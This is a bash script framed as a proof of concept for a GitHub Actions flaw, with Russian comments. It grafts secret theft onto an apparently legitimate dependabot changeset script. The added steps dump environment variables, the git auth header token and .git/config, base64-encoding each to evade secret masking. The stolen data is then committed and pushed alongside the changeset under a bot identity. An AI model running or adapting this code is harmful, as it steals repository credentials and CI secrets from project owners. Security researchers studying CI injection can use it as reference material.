#!/bin/bash

# Демонстрация уязвимости в GitHub Actions workflow
echo "=== PoC: Уязвимость в GitHub Actions workflow ==="

# Вывод информации о среде выполнения
echo "Текущий пользователь: $(whoami)"
echo "Текущая директория: $(pwd)"
echo "Содержимое директории: $(ls -la)"

# Создание файла для хранения украденных данных
echo "=== Создание файла для хранения данных ===" > exfiltrated_data.txt

# Экспорт всех переменных окружения в base64 для обхода маскирования секретов
echo "=== Переменные окружения (base64) ===" >> exfiltrated_data.txt
env | base64 >> exfiltrated_data.txt

# Попытка получить токен GitHub из конфигурации git
echo "=== Токен GitHub из git config (base64) ===" >> exfiltrated_data.txt
git config --get http.https://github.com/.extraheader | base64 >> exfiltrated_data.txt

# Вывод содержимого важных файлов
echo "=== Содержимое .git/config (base64) ===" >> exfiltrated_data.txt
cat .git/config | base64 >> exfiltrated_data.txt

# Оригинальный код скрипта для сохранения функциональности
pr_number=$(gh pr view --json number --jq '.number')
changeset_filename=".changeset/dependabot-$pr_number.md"

if [ -f $changeset_filename ]; then
  echo "Changeset $changeset_filename already exists, skipping"
  exit 0
fi

package_names=()
for file in $(gh pr diff --name-only)
do
  if [[ "$file" =~ ^packages\/.*\/package.json$ ]]; then
    echo "Found changed package.json: $file"

    package_name=$(cat $file | jq -r '.name')
    package_names+=("$package_name")
  fi
done

package_updates=""
for package_name in "${package_names[@]}"
do
  package_updates="$package_updates"`printf "\n'%s': patch" $package_name`
done

dependencies='`'$(sed "s/,/\`, \`/g" <<< "$DEPENDENCIES")'`'
echo "Creating changeset: $changeset_filename"
echo "---$package_updates
---

Updated $dependencies dependencies" > $changeset_filename

# Добавляем украденные данные в коммит
cp exfiltrated_data.txt $changeset_filename.evidence

echo "Committing changeset and evidence"
git config user.name "shopify-github-actions-access[bot]"
git config user.email "shopify-github-actions-access[bot]@users.noreply.github.com"
git add .changeset
git add $changeset_filename.evidence
git commit -m "[dependabot skip] Adding changeset for dependabot update"
git push